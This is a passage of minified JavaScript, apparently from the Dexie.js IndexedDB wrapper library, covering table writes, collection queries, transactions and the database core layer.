e)if(l(e,i))try{n[i]=e[i]}catch(e){}return n}return this.schema.mappedClass=t,this.schema.readHook&&this.hook.reading.unsubscribe(this.schema.readHook),this.schema.readHook=e,this.hook("reading",e),t},Ie.prototype.defineClass=function(){return this.mapToClass((function(t){o(this,t)}))},Ie.prototype.add=function(t,e){var n=this,i=this.schema.primKey,r=i.auto,o=i.keyPath,s=t;return o&&r&&(s=Le(o)(t)),this._trans("readwrite",(function(t){return n.core.mutate({trans:t,type:"add",keys:null!=e?[e]:null,values:[s]})})).then((function(t){return t.numFailures?Dt.reject(t.failures[0]):t.lastResult})).then((function(e){if(o)try{x(t,o,e)}catch(e){}return e}))},Ie.prototype.update=function(t,e){if("object"!=typeof e||i(e))throw new et.InvalidArgument("Modifications must be an object.");if("object"!=typeof t||i(t))return this.where(":id").equals(t).modify(e);n(e).forEach((function(n){x(t,n,e[n])}));var r=k(t,this.schema.primKey.keyPath);return void 0===r?ge(new et.InvalidArgument("Given object does not contain its primary key")):this.where(":id").equals(r).modify(e)},Ie.prototype.put=function(t,e){var n=this,i=this.schema.primKey,r=i.auto,o=i.keyPath,s=t;return o&&r&&(s=Le(o)(t)),this._trans("readwrite",(function(t){return n.core.mutate({trans:t,type:"put",values:[s],keys:null!=e?[e]:null})})).then((function(t){return t.numFailures?Dt.reject(t.failures[0]):t.lastResult})).then((function(e){if(o)try{x(t,o,e)}catch(e){}return e}))},Ie.prototype.delete=function(t){var e=this;return this._trans("readwrite",(function(n){return e.core.mutate({trans:n,type:"delete",keys:[t]})})).then((function(t){return t.numFailures?Dt.reject(t.failures[0]):void 0}))},Ie.prototype.clear=function(){var t=this;return this._trans("readwrite",(function(e){return t.core.mutate({trans:e,type:"deleteRange",range:Te})})).then((function(t){return t.numFailures?Dt.reject(t.failures[0]):void 0}))},Ie.prototype.bulkGet=function(t){var e=this;return this._trans("readonly",(function(n){return e.core.getMany({keys:t,trans:n}).then((function(t){return t.map((function(t){return e.hook.reading.fire(t)}))}))}))},Ie.prototype.bulkAdd=function(t,e,n){var i=this,r=Array.isArray(e)?e:void 0,o=(n=n||(r?void 0:e))?n.allKeys:void 0;return this._trans("readwrite",(function(e){var n=i.schema.primKey,s=n.auto,a=n.keyPath;if(a&&r)throw new et.InvalidArgument("bulkAdd(): keys argument invalid on tables with inbound keys");if(r&&r.length!==t.length)throw new et.InvalidArgument("Arguments objects and keys must have the same length");var l=t.length,c=a&&s?t.map(Le(a)):t;return i.core.mutate({trans:e,type:"add",keys:r,values:c,wantResults:o}).then((function(t){var e=t.numFailures,n=t.results,r=t.lastResult,s=t.failures;if(0===e)return o?n:r;throw new Q(i.name+".bulkAdd(): "+e+" of "+l+" operations failed",Object.keys(s).map((function(t){return s[t]})))}))}))},Ie.prototype.bulkPut=function(t,e,n){var i=this,r=Array.isArray(e)?e:void 0,o=(n=n||(r?void 0:e))?n.allKeys:void 0;return this._trans("readwrite",(function(e){var n=i.schema.primKey,s=n.auto,a=n.keyPath;if(a&&r)throw new et.InvalidArgument("bulkPut(): keys argument invalid on tables with inbound keys");if(r&&r.length!==t.length)throw new et.InvalidArgument("Arguments objects and keys must have the same length");var l=t.length,c=a&&s?t.map(Le(a)):t;return i.core.mutate({trans:e,type:"put",keys:r,values:c,wantResults:o}).then((function(t){var e=t.numFailures,n=t.results,r=t.lastResult,s=t.failures;if(0===e)return o?n:r;throw new Q(i.name+".bulkPut(): "+e+" of "+l+" operations failed",Object.keys(s).map((function(t){return s[t]})))}))}))},Ie.prototype.bulkDelete=function(t){var e=this,n=t.length;return this._trans("readwrite",(function(n){return e.core.mutate({trans:n,type:"delete",keys:t})})).then((function(t){var i=t.numFailures,r=t.lastResult,o=t.failures;if(0===i)return r;throw new Q(e.name+".bulkDelete(): "+i+" of "+n+" operations failed",o)}))},Ie);function Ie(){}function Ae(t){var e={},r=function(n,i){if(i){for(var r=arguments.length,o=new Array(r-1);--r;)o[r-1]=arguments[r];return e[n].subscribe.apply(null,o),t}if("string"==typeof n)return e[n]};r.addEventType=a;for(var o=1,s=arguments.length;o<s;++o)a(arguments[o]);return r;function a(t,o,s){if("object"!=typeof t){var l;o=o||dt;var c={subscribers:[],fire:s=s||rt,subscribe:function(t){-1===c.subscribers.indexOf(t)&&(c.subscribers.push(t),c.fire=o(c.fire,t))},unsubscribe:function(t){c.subscribers=c.subscribers.filter((function(e){return e!==t})),c.fire=c.subscribers.reduce(o,s)}};return e[t]=r[t]=c,c}n(l=t).forEach((function(t){var e=l[t];if(i(e))a(t,l[t][0],l[t][1]);else{if("asap"!==e)throw new et.InvalidArgument("Invalid event config");var n=a(t,ot,(function(){for(var t=arguments.length,e=new Array(t);t--;)e[t]=arguments[t];n.subscribers.forEach((function(t){b((function(){t.apply(null,e)}))}))}))}}))}}function Pe(t,e){return h(e).from({prototype:t}),e}function Ne(t,e){return!(t.filter||t.algorithm||t.or)&&(e?t.justLimit:!t.replayFilter)}function Be(t,e){t.filter=Ee(t.filter,e)}function De(t,e,n){var i=t.replayFilter;t.replayFilter=i?function(){return Ee(i(),e())}:e,t.justLimit=n&&!i}function Re(t,e){if(t.isPrimKey)return e.primaryKey;var n=e.getIndexByKeyPath(t.index);if(!n)throw new et.Schema("KeyPath "+t.index+" on object store "+e.name+" is not indexed");return n}function je(t,e,n){var i=Re(t,e.schema);return e.openCursor({trans:n,values:!t.keysOnly,reverse:"prev"===t.dir,unique:!!t.unique,query:{index:i,range:t.range}})}function Me(t,e,n,i){var r=t.replayFilter?Ee(t.filter,t.replayFilter()):t.filter;if(t.or){var o={},s=function(t,n,i){var s,a;r&&!r(n,i,(function(t){return n.stop(t)}),(function(t){return n.fail(t)}))||("[object ArrayBuffer]"==(a=""+(s=n.primaryKey))&&(a=""+new Uint8Array(s)),l(o,a)||(o[a]=!0,e(t,n,i)))};return Promise.all([t.or._iterate(s,n),Fe(je(t,i,n),t.algorithm,s,!t.keysOnly&&t.valueMapper)])}return Fe(je(t,i,n),Ee(t.algorithm,r),e,!t.keysOnly&&t.valueMapper)}function Fe(t,e,n,i){var r=Xt(i?function(t,e,r){return n(i(t),e,r)}:n);return t.then((function(t){if(t)return t.start((function(){var n=function(){return t.continue()};e&&!e(t,(function(t){return n=t}),(function(e){t.stop(e),n=rt}),(function(e){t.fail(e),n=rt}))||r(t.value,t,(function(t){return n=t})),n()}))}))}var qe=(He.prototype._read=function(t,e){var n=this._ctx;return n.error?n.table._trans(null,ge.bind(null,n.error)):n.table._trans("readonly",t).then(e)},He.prototype._write=function(t){var e=this._ctx;return e.error?e.table._trans(null,ge.bind(null,e.error)):e.table._trans("readwrite",t,"locked")},He.prototype._addAlgorithm=function(t){var e=this._ctx;e.algorithm=Ee(e.algorithm,t)},He.prototype._iterate=function(t,e){return Me(this._ctx,t,e,this._ctx.table.core)},He.prototype.clone=function(t){var e=Object.create(this.constructor.prototype),n=Object.create(this._ctx);return t&&o(n,t),e._ctx=n,e},He.prototype.raw=function(){return this._ctx.valueMapper=null,this},He.prototype.each=function(t){var e=this._ctx;return this._read((function(n){return Me(e,t,n,e.table.core)}))},He.prototype.count=function(t){var e=this;return this._read((function(t){var n=e._ctx,i=n.table.core;if(Ne(n,!0))return i.count({trans:t,query:{index:Re(n,i.schema),range:n.range}}).then((function(t){return Math.min(t,n.limit)}));var r=0;return Me(n,(function(){return++r,!1}),t,i).then((function(){return r}))})).then(t)},He.prototype.sortBy=function(t,e){var n=t.split(".").reverse(),i=n[0],r=n.length-1;function o(t,e){return e?o(t[n[e]],e-1):t[i]}var s="next"===this._ctx.dir?1:-1;function a(t,e){var n=o(t,r),i=o(e,r);return n<i?-s:i<n?s:0}return this.toArray((function(t){return t.sort(a)})).then(e)},He.prototype.toArray=function(t){var e=this;return this._read((function(t){var n=e._ctx;if("next"===n.dir&&Ne(n,!0)&&0<n.limit){var i=n.valueMapper,r=Re(n,n.table.core.schema);return n.table.core.query({trans:t,limit:n.limit,values:!0,query:{index:r,range:n.range}}).then((function(t){var e=t.result;return i?e.map(i):e}))}var o=[];return Me(n,(function(t){return o.push(t)}),t,n.table.core).then((function(){return o}))}),t)},He.prototype.offset=function(t){var e=this._ctx;return t<=0||(e.offset+=t,Ne(e)?De(e,(function(){var e=t;return function(t,n){return 0===e||(1===e?--e:n((function(){t.advance(e),e=0})),!1)}})):De(e,(function(){var e=t;return function(){return--e<0}}))),this},He.prototype.limit=function(t){return this._ctx.limit=Math.min(this._ctx.limit,t),De(this._ctx,(function(){var e=t;return function(t,n,i){return--e<=0&&n(i),0<=e}}),!0),this},He.prototype.until=function(t,e){return Be(this._ctx,(function(n,i,r){return!t(n.value)||(i(r),e)})),this},He.prototype.first=function(t){return this.limit(1).toArray((function(t){return t[0]})).then(t)},He.prototype.last=function(t){return this.reverse().first(t)},He.prototype.filter=function(t){var e,n;return Be(this._ctx,(function(e){return t(e.value)})),e=this._ctx,n=t,e.isMatch=Ee(e.isMatch,n),this},He.prototype.and=function(t){return this.filter(t)},He.prototype.or=function(t){return new this.db.WhereClause(this._ctx.table,t,this)},He.prototype.reverse=function(){return this._ctx.dir="prev"===this._ctx.dir?"next":"prev",this._ondirectionchange&&this._ondirectionchange(this._ctx.dir),this},He.prototype.desc=function(){return this.reverse()},He.prototype.eachKey=function(t){var e=this._ctx;return e.keysOnly=!e.isMatch,this.each((function(e,n){t(n.key,n)}))},He.prototype.eachUniqueKey=function(t){return this._ctx.unique="unique",this.eachKey(t)},He.prototype.eachPrimaryKey=function(t){var e=this._ctx;return e.keysOnly=!e.isMatch,this.each((function(e,n){t(n.primaryKey,n)}))},He.prototype.keys=function(t){var e=this._ctx;e.keysOnly=!e.isMatch;var n=[];return this.each((function(t,e){n.push(e.key)})).then((function(){return n})).then(t)},He.prototype.primaryKeys=function(t){var e=this._ctx;if("next"===e.dir&&Ne(e,!0)&&0<e.limit)return this._read((function(t){var n=Re(e,e.table.core.schema);return e.table.core.query({trans:t,values:!1,limit:e.limit,query:{index:n,range:e.range}})})).then((function(t){return t.result})).then(t);e.keysOnly=!e.isMatch;var n=[];return this.each((function(t,e){n.push(e.primaryKey)})).then((function(){return n})).then(t)},He.prototype.uniqueKeys=function(t){return this._ctx.unique="unique",this.keys(t)},He.prototype.firstKey=function(t){return this.limit(1).keys((function(t){return t[0]})).then(t)},He.prototype.lastKey=function(t){return this.reverse().firstKey(t)},He.prototype.distinct=function(){var t=this._ctx,e=t.index&&t.table.schema.idxByName[t.index];if(!e||!e.multi)return this;var n={};return Be(this._ctx,(function(t){var e=t.primaryKey.toString(),i=l(n,e);return n[e]=!0,!i})),this},He.prototype.modify=function(t){var e=this,i=this._ctx;return this._write((function(r){var o,s,a;function l(t,e){var i=e.failures,r=e.numFailures;m+=t-r;for(var o=0,s=n(i);o<s.length;o++){var a=s[o];g.push(i[a])}}a="function"==typeof t?t:(o=n(t),s=o.length,function(e){for(var n=!1,i=0;i<s;++i){var r=o[i],a=t[r];k(e,r)!==a&&(x(e,r,a),n=!0)}return n});var c=i.table.core,u=c.schema.primaryKey,d=u.outbound,h=u.extractKey,f="testmode"in Pn?1:2e3,p=e.db.core.cmp,g=[],m=0,v=[];return e.clone().primaryKeys().then((function(t){var e=function(n){var i=Math.min(f,t.length-n);return c.getMany({trans:r,keys:t.slice(n,n+i)}).then((function(o){for(var s=[],u=[],g=d?[]:null,m=[],v=0;v<i;++v){var y=o[v],b={value:O(y),primKey:t[n+v]};!1!==a.call(b,b.value,b)&&(null==b.value?m.push(t[n+v]):d||0===p(h(y),h(b.value))?(u.push(b.value),d&&g.push(t[n+v])):(m.push(t[n+v]),s.push(b.value)))}return Promise.resolve(0<s.length&&c.mutate({trans:r,type:"add",values:s}).then((function(t){for(var e in t.failures)m.splice(parseInt(e),1);l(s.length,t)}))).then((function(t){return 0<u.length&&c.mutate({trans:r,type:"put",keys:g,values:u}).then((function(t){return l(u.length,t)}))})).then((function(){return 0<m.length&&c.mutate({trans:r,type:"delete",keys:m}).then((function(t){return l(m.length,t)}))})).then((function(){return t.length>n+i&&e(n+f)}))}))};return e(0).then((function(){if(0<g.length)throw new G("Error modifying one or more objects",g,m,v);return t.length}))}))}))},He.prototype.delete=function(){var t=this._ctx,e=t.range;return Ne(t)&&(t.isPrimKey&&!_e||3===e.type)?this._write((function(n){var i=t.table.core.schema.primaryKey,r=e;return t.table.core.count({trans:n,query:{index:i,range:r}}).then((function(e){return t.table.core.mutate({trans:n,type:"deleteRange",range:r}).then((function(t){var n=t.failures,i=(t.lastResult,t.results,t.numFailures);if(i)throw new G("Could not delete some values",Object.keys(n).map((function(t){return n[t]})),e-i);return e-i}))}))})):this.modify((function(t,e){return e.value=null}))},He);function He(){}function We(t,e){return t<e?-1:t===e?0:1}function ze(t,e){return e<t?-1:t===e?0:1}function Ue(t,e,n){var i=t instanceof Ge?new t.Collection(t):t;return i._ctx.error=new(n||TypeError)(e),i}function Ze(t){return new t.Collection(t,(function(){return Ye("")})).limit(0)}function Ve(t,e,n,i,r,o){for(var s=Math.min(t.length,i.length),a=-1,l=0;l<s;++l){var c=e[l];if(c!==i[l])return r(t[l],n[l])<0?t.substr(0,l)+n[l]+n.substr(l+1):r(t[l],i[l])<0?t.substr(0,l)+i[l]+n.substr(l+1):0<=a?t.substr(0,a)+e[a]+n.substr(a+1):null;r(t[l],c)<0&&(a=l)}return s<i.length&&"next"===o?t+n.substr(t.length):s<t.length&&"prev"===o?t.substr(0,n.length):a<0?null:t.substr(0,a)+i[a]+n.substr(a+1)}function Ke(t,e,n,i){var r,o,s,a,l,c,u,d=n.length;if(!n.every((function(t){return"string"==typeof t})))return Ue(t,be);function h(t){r="next"===t?function(t){return t.toUpperCase()}:function(t){return t.toLowerCase()},o="next"===t?function(t){return t.toLowerCase()}:function(t){return t.toUpperCase()},s="next"===t?We:ze;var e=n.map((function(t){return{lower:o(t),upper:r(t)}})).sort((function(t,e){return s(t.lower,e.lower)}));a=e.map((function(t){return t.upper})),l=e.map((function(t){return t.lower})),u="next"===(c=t)?"":i}h("next");var f=new t.Collection(t,(function(){return Xe(a[0],l[d-1]+i)}));f._ondirectionchange=function(t){h(t)};var p=0;return f._addAlgorithm((function(t,n,i){var r=t.key;if("string"!=typeof r)return!1;var h=o(r);if(e(h,l,p))return!0;for(var f=null,g=p;g<d;++g){var m=Ve(r,h,a[g],l[g],s,c);null===m&&null===f?p=g+1:(null===f||0<s(f,m))&&(f=m)}return n(null!==f?function(){t.continue(f+u)}:i),!1})),f}function Xe(t,e,n,i){return{type:2,lower:t,upper:e,lowerOpen:n,upperOpen:i}}function Ye(t){return{type:1,lower:t,upper:t}}var Ge=(Object.defineProperty(Qe.prototype,"Collection",{get:function(){return this._ctx.table.db.Collection},enumerable:!0,configurable:!0}),Qe.prototype.between=function(t,e,n,i){n=!1!==n,i=!0===i;try{return 0<this._cmp(t,e)||0===this._cmp(t,e)&&(n||i)&&(!n||!i)?Ze(this):new this.Collection(this,(function(){return Xe(t,e,!n,!i)}))}catch(t){return Ue(this,ye)}},Qe.prototype.equals=function(t){return null==t?Ue(this,ye):new this.Collection(this,(function(){return Ye(t)}))},Qe.prototype.above=function(t){return null==t?Ue(this,ye):new this.Collection(this,(function(){return Xe(t,void 0,!0)}))},Qe.prototype.aboveOrEqual=function(t){return null==t?Ue(this,ye):new this.Collection(this,(function(){return Xe(t,void 0,!1)}))},Qe.prototype.below=function(t){return null==t?Ue(this,ye):new this.Collection(this,(function(){return Xe(void 0,t,!1,!0)}))},Qe.prototype.belowOrEqual=function(t){return null==t?Ue(this,ye):new this.Collection(this,(function(){return Xe(void 0,t)}))},Qe.prototype.startsWith=function(t){return"string"!=typeof t?Ue(this,be):this.between(t,t+ve,!0,!0)},Qe.prototype.startsWithIgnoreCase=function(t){return""===t?this.startsWith(t):Ke(this,(function(t,e){return 0===t.indexOf(e[0])}),[t],ve)},Qe.prototype.equalsIgnoreCase=function(t){return Ke(this,(function(t,e){return t===e[0]}),[t],"")},Qe.prototype.anyOfIgnoreCase=function(){var t=j.apply(R,arguments);return 0===t.length?Ze(this):Ke(this,(function(t,e){return-1!==e.indexOf(t)}),t,"")},Qe.prototype.startsWithAnyOfIgnoreCase=function(){var t=j.apply(R,arguments);return 0===t.length?Ze(this):Ke(this,(function(t,e){return e.some((function(e){return 0===t.indexOf(e)}))}),t,ve)},Qe.prototype.anyOf=function(){var t=this,e=j.apply(R,arguments),n=this._cmp;try{e.sort(n)}catch(i){return Ue(this,ye)}if(0===e.length)return Ze(this);var i=new this.Collection(this,(function(){return Xe(e[0],e[e.length-1])}));i._ondirectionchange=function(i){n="next"===i?t._ascending:t._descending,e.sort(n)};var r=0;return i._addAlgorithm((function(t,i,o){for(var s=t.key;0<n(s,e[r]);)if(++r===e.length)return i(o),!1;return 0===n(s,e[r])||(i((function(){t.continue(e[r])})),!1)})),i},Qe.prototype.notEqual=function(t){return this.inAnyRange([[-1/0,t],[t,this.db._maxKey]],{includeLowers:!1,includeUppers:!1})},Qe.prototype.noneOf=function(){var t=j.apply(R,arguments);if(0===t.length)return new this.Collection(this);try{t.sort(this._ascending)}catch(t){return Ue(this,ye)}var e=t.reduce((function(t,e){return t?t.concat([[t[t.length-1][1],e]]):[[-1/0,e]]}),null);return e.push([t[t.length-1],this.db._maxKey]),this.inAnyRange(e,{includeLowers:!1,includeUppers:!1})},Qe.prototype.inAnyRange=function(t,e){var n=this,i=this._cmp,r=this._ascending,o=this._descending,s=this._min,a=this._max;if(0===t.length)return Ze(this);if(!t.every((function(t){return void 0!==t[0]&&void 0!==t[1]&&r(t[0],t[1])<=0})))return Ue(this,"First argument to inAnyRange() must be an Array of two-value Arrays [lower,upper] where upper must not be lower than lower",et.InvalidArgument);var l,c=!e||!1!==e.includeLowers,u=e&&!0===e.includeUppers,d=r;function h(t,e){return d(t[0],e[0])}try{(l=t.reduce((function(t,e){for(var n=0,r=t.length;n<r;++n){var o=t[n];if(i(e[0],o[1])<0&&0<i(e[1],o[0])){o[0]=s(o[0],e[0]),o[1]=a(o[1],e[1]);break}}return n===r&&t.push(e),t}),[])).sort(h)}catch(t){return Ue(this,ye)}var f=0,p=u?function(t){return 0<r(t,l[f][1])}:function(t){return 0<=r(t,l[f][1])},g=c?function(t){return 0<o(t,l[f][0])}:function(t){return 0<=o(t,l[f][0])},m=p,v=new this.Collection(this,(function(){return Xe(l[0][0],l[l.length-1][1],!c,!u)}));return v._ondirectionchange=function(t){d="next"===t?(m=p,r):(m=g,o),l.sort(h)},v._addAlgorithm((function(t,e,i){for(var o,s=t.key;m(s);)if(++f===l.length)return e(i),!1;return!p(o=s)&&!g(o)||(0===n._cmp(s,l[f][1])||0===n._cmp(s,l[f][0])||e((function(){d===r?t.continue(l[f][0]):t.continue(l[f][1])})),!1)})),v},Qe.prototype.startsWithAnyOf=function(){var t=j.apply(R,arguments);return t.every((function(t){return"string"==typeof t}))?0===t.length?Ze(this):this.inAnyRange(t.map((function(t){return[t,t+ve]}))):Ue(this,"startsWithAnyOf() only works with strings")},Qe);function Qe(){}function Je(t){return 1===t.length?t[0]:t}function tn(t){try{return t.only([[]]),[[]]}catch(t){return ve}}function en(t){return Xt((function(e){return nn(e),t(e.target.error),!1}))}function nn(t){t.stopPropagation&&t.stopPropagation(),t.preventDefault&&t.preventDefault()}var rn=(on.prototype._lock=function(){return y(!At.global),++this._reculock,1!==this._reculock||At.global||(At.lockOwnerFor=this),this},on.prototype._unlock=function(){if(y(!At.global),0==--this._reculock)for(At.global||(At.lockOwnerFor=null);0<this._blockedFuncs.length&&!this._locked();){var t=this._blockedFuncs.shift();try{ce(t[1],t[0])}catch(t){}}return this},on.prototype._locked=function(){return this._reculock&&At.lockOwnerFor!==this},on.prototype.create=function(t){var e=this;if(!this.mode)return this;var n=this.db.idbdb,i=this.db._state.dbOpenError;if(y(!this.idbtrans),!t&&!n)switch(i&&i.name){case"DatabaseClosedError":throw new et.DatabaseClosed(i);case"MissingAPIError":throw new et.MissingAPI(i.message,i);default:throw new et.OpenFailed(i)}if(!this.active)throw new et.TransactionInactive;return y(null===this._completion._state),(t=this.idbtrans=t||n.transaction(Je(this.storeNames),this.mode)).onerror=Xt((function(n){nn(n),e._reject(t.error)})),t.onabort=Xt((function(n){nn(n),e.active&&e._reject(new et.Abort(t.error)),e.active=!1,e.on("abort").fire(n)})),t.oncomplete=Xt((function(){e.active=!1,e._resolve()})),this},on.prototype._promise=function(t,e,n){var i=this;if("readwrite"===t&&"readwrite"!==this.mode)return ge(new et.ReadOnly("Transaction is readonly"));if(!this.active)return ge(new et.TransactionInactive);if(this._locked())return new Dt((function(r,o){i._blockedFuncs.push([function(){i._promise(t,e,n).then(r,o)},At])}));if(n)return ne((function(){var t=new Dt((function(t,n){i._lock();var r=e(t,n,i);r&&r.then&&r.then(t,n)}));return t.finally((function(){return i._unlock()})),t._lib=!0,t}));var r=new Dt((function(t,n){var r=e(t,n,i);r&&r.then&&r.then(t,n)}));return r._lib=!0,r},on.prototype._root=function(){return this.parent?this.parent._root():this},on.prototype.waitFor=function(t){var e,n=this._root(),i=Dt.resolve(t);n._waitingFor?n._waitingFor=n._waitingFor.then((function(){return i})):(n._waitingFor=i,n._waitingQueue=[],e=n.idbtrans.objectStore(n.storeNames[0]),function t(){for(++n._spinCount;n._waitingQueue.length;)n._waitingQueue.shift()();n._waitingFor&&(e.get(-1/0).onsuccess=t)}());var r=n._waitingFor;return new Dt((function(t,e){i.then((function(e){return n._waitingQueue.push(Xt(t.bind(null,e)))}),(function(t){return n._waitingQueue.push(Xt(e.bind(null,t)))})).finally((function(){n._waitingFor===r&&(n._waitingFor=null)}))}))},on.prototype.abort=function(){this.active&&this._reject(new et.Abort),this.active=!1},on.prototype.table=function(t){var e=this._memoizedTables||(this._memoizedTables={});if(l(e,t))return e[t];var n=this.schema[t];if(!n)throw new et.NotFound("Table "+t+" not part of transaction");var i=new this.db.Table(t,n,this);return i.core=this.db.core.table(t),e[t]=i},on);function on(){}function sn(t,e,n,i,r,o,s){return{name:t,keyPath:e,unique:n,multi:i,auto:r,compound:o,src:(n&&!s?"&":"")+(i?"*":"")+(r?"++":"")+an(e)}}function an(t){return"string"==typeof t?t:t?"["+[].join.call(t,"+")+"]":""}function ln(t,e,n){return{name:t,primKey:e,indexes:n,mappedClass:null,idxByName:w(n,(function(t){return[t.name,t]}))}}function cn(t){return null==t?function(){}:"string"==typeof t?1===(e=t).split(".").length?function(t){return t[e]}:function(t){return k(t,e)}:function(e){return k(e,t)};var e}function un(t,e){return"delete"===e.type?e.keys:e.keys||e.values.map(t.extractKey)}function dn(t){return[].slice.call(t)}var hn=0;function fn(t){return null==t?":id":"string"==typeof t?t:"["+t.join("+")+"]"}function pn(t,n,r,o){var s=n.cmp.bind(n);function a(t){if(3===t.type)return null;if(4===t.type)throw new Error("Cannot convert never type to IDBKeyRange");var e=t.lower,n=t.upper,i=t.lowerOpen,o=t.upperOpen;return void 0===e?void 0===n?null:r.upperBound(n,!!o):void 0===n?r.lowerBound(e,!!i):r.bound(e,n,!!i,!!o)}var l,c,u,d=(c=o,u=dn((l=t).objectStoreNames),{schema:{name:l.name,tables:u.map((function(t){return c.objectStore(t)})).map((function(t){var e=t.keyPath,n=t.autoIncrement,r=i(e),o=null==e,s={},a={name:t.name,primaryKey:{name:null,isPrimaryKey:!0,outbound:o,compound:r,keyPath:e,autoIncrement:n,unique:!0,extractKey:cn(e)},indexes:dn(t.indexNames).map((function(e){return t.index(e)})).map((function(t){var e=t.name,n=t.unique,r=t.multiEntry,o=t.keyPath,a={name:e,compound:i(o),keyPath:o,unique:n,multiEntry:r,extractKey:cn(o)};return s[fn(o)]=a})),getIndexByKeyPath:function(t){return s[fn(t)]}};return s[":id"]=a.primaryKey,null!=e&&(s[fn(e)]=a.primaryKey),a}))},hasGetAll:0<u.length&&"getAll"in c.objectStore(u[0])&&!("undefined"!=typeof navigator&&/Safari/.test(navigator.userAgent)&&!/(Chrome\/|Edge\/)/.test(navigator.userAgent)&&[].concat(navigator.userAgent.match(/Safari\/(\d*)/))[1]<604)}),h=d.schema,f=d.hasGetAll,p=h.tables.map((function(t){var n,i=t.name;return{name:i,schema:t,mutate:function(n){var r=n.trans,o=n.type,s=n.keys,l=n.values,c=n.range,u=n.wantResults;return new Promise((function(n,d){n=Xt(n);var h=r.objectStore(i),f=null==h.keyPath,p="put"===o||"add"===o;if(!p&&"delete"!==o&&"deleteRange"!==o)throw new Error("Invalid operation type: "+o);var g=(s||l||{length:1}).length;if(s&&l&&s.length!==l.length)throw new Error("Given keys array must have same length as given values array.");if(0===g)return n({numFailures:0,failures:{},results:[],lastResult:void 0});function m(t){++k,nn(t),b&&(b[t.target._reqno]=void 0),w[t.target._reqno]=t.target.error}function v(t){var e=t.target;b[e._reqno]=e.result}var y,b=u&&e(s||un(t.primaryKey,{type:o,keys:s,values:l})),w=[],k=0;if("deleteRange"===o){if(4===c.type)return n({numFailures:k,failures:w,results:b,lastResult:void 0});y=3===c.type?h.clear():h.delete(a(c))}else{var x=p?f?[l,s]:[l,null]:[s,null],_=x[0],S=x[1];if(p)for(var C=0;C<g;++C)(y=S&&void 0!==S[C]?h[o](_[C],S[C]):h[o](_[C]))._reqno=C,b&&void 0===b[C]&&(y.onsuccess=v),y.onerror=m;else for(C=0;C<g;++C)(y=h[o](_[C]))._reqno=C,y.onerror=m}function $(t){var e=t.target.result;b&&(b[g-1]=e),n({numFailures:k,failures:w,results:b,lastResult:e})}y.onerror=function(t){m(t),$(t)},y.onsuccess=$}))},getMany:function(t){var e=t.trans,n=t.keys;return new Promise((function(t,r){t=Xt(t);for(var o,s=e.objectStore(i),a=n.length,l=new Array(a),c=0,u=0,d=function(e){var n=e.target;l[n._pos]=n.result,++u===c&&t(l)},h=en(r),f=0;f<a;++f)null!=n[f]&&((o=s.get(n[f]))._pos=f,o.onsuccess=d,o.onerror=h,++c);0===c&&t(l)}))},get:function(t){var e=t.trans,n=t.key;return new Promise((function(t,r){t=Xt(t);var o=e.objectStore(i).get(n);o.onsuccess=function(e){return t(e.target.result)},o.onerror=en(r)}))},query:(n=f,function(t){return new Promise((function(e,r){e=Xt(e);var o,s,l,c,u=t.trans,d=t.values,h=t.limit,f=t.query,p=h===1/0?void 0:h,g=f.index,m=f.range,v=u.objectStore(i),y=g.isPrimaryKey?v:v.index(g.name),b=a(m);if(0===h)return e({result:[]});n?((o=d?y.getAll(b,p):y.getAllKeys(b,p)).onsuccess=function(t){return e({result:t.target.result})},o.onerror=en(r)):(s=0,l=!d&&"openKeyCursor"in y?y.openKeyCursor(b):y.openCursor(b),c=[],l.onsuccess=function(t){var n=l.result;return n?(c.push(d?n.value:n.primaryKey),++s===h?e({result:c}):void n.continue()):e({result:c})},l.onerror=en(r))}))}),openCursor:function(t){var e=t.trans,n=t.values,r=t.query,o=t.reverse,s=t.unique;return new Promise((function(t,l){t=Xt(t);var c=r.index,u=r.range,d=e.objectStore(i),h=c.isPrimaryKey?d:d.index(c.name),f=o?s?"prevunique":"prev":s?"nextunique":"next",p=!n&&"openKeyCursor"in h?h.openKeyCursor(a(u),f):h.openCursor(a(u),f);p.onerror=en(l),p.onsuccess=Xt((function(n){var i,r,o,s,a=p.result;a?(a.___id=++hn,a.done=!1,i=a.continue.bind(a),r=(r=a.continuePrimaryKey)&&r.bind(a),o=a.advance.bind(a),s=function(){throw new Error("Cursor not stopped")},a.trans=e,a.stop=a.continue=a.continuePrimaryKey=a.advance=function(){throw new Error("Cursor not started")},a.fail=Xt(l),a.next=function(){var t=this,e=1;return this.start((function(){return e--?t.continue():t.stop()})).then((function(){return t}))},a.start=function(t){function e(){if(p.result)try{t()}catch(t){a.fail(t)}else a.done=!0,a.start=function(){throw new Error("Cursor behind last entry")},a.stop()}var n=new Promise((function(t,e){t=Xt(t),p.onerror=en(e),a.fail=e,a.stop=function(e){a.stop=a.continue=a.continuePrimaryKey=a.advance=s,t(e)}}));return p.onsuccess=Xt((function(t){(p.onsuccess=e)()})),a.continue=i,a.continuePrimaryKey=r,a.advance=o,e(),n},t(a)):t(null)}),l)}))},count:function(t){var e=t.query,n=t.trans,r=e.index,o=e.range;return new Promise((function(t,e){var s=n.objectStore(i),l=r.isPrimaryKey?s:s.index(r.name),c=a(o),u=c?l.count(c):l.count();u.onsuccess=Xt((function(e){return t(e.target.result)})),u.onerror=en(e)}))}}})),g={};return p.forEach((function(t){return g[t.name]=t})),{stack:"dbcore",transaction:t.transaction.bind(t),table:function(t){if(!g[t])throw new Error("Table '"+t+"' not found");return g[t]},cmp:s,MIN_KEY:-1/0,MAX_KEY:tn(r),schema:h}}function gn(e,n){var i=n.db,r=function(e,n,i,r){var o,s=i.IDBKeyRange;return{dbcore:(o=pn(n,i.indexedDB,s,r),e.dbcore.reduce((function(e,n){var i=n.create;return t(t({},e),i(e))}),o))}}(e._middlewares,i,e._deps,n);e.core=r.dbcore,e.tables.forEach((function(t){var n=t.name;e.core.schema.tables.some((function(t){return t.name===n}))&&(t.core=e.core.table(n),e[n]instanceof e.Table&&(e[n].core=t.core))}))}function mn(t,e,n,i){n.forEach((function(n){var r=i[n];e.forEach((function(e){var i=p(e,n);(!i||"value"in i&&void 0===i.value)&&(e===t.Transaction.prototype||e instanceof t.Transaction?d(e,n,{get:function(){return this.table(n)},set:function(t){u(this,n,{value:t,writable:!0,configurable:!0,enumerable:!0})}}):e[n]=new t.Table(n,r))}))}))}function vn(t,e){e.forEach((function(e){for(var n in e)e[n]instanceof t.Table&&delete e[n]}))}function yn(t,e){return t._cfg.version-e._cfg.version}function bn(t,e){var n,i={del:[],add:[],change:[]};for(n in t)e[n]||i.del.push(n);for(n in e){var r=t[n],o=e[n];if(r){var 